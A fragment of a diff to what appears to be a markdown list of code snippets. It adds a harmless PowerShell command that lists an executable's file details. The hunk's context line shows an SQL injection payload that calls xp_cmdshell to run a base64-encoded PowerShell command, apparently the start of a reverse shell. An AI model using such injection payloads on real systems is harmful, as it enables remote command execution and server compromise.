@@ -37,7 +37,8 @@ test' ; EXECUTE xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtA
 ```
 
 ```
-
+Get-Item "C:\DevelopmentExecutables\auditTracker.exe" |
+Select-Object Name, Length, LastWriteTime
 ```
 
 ```
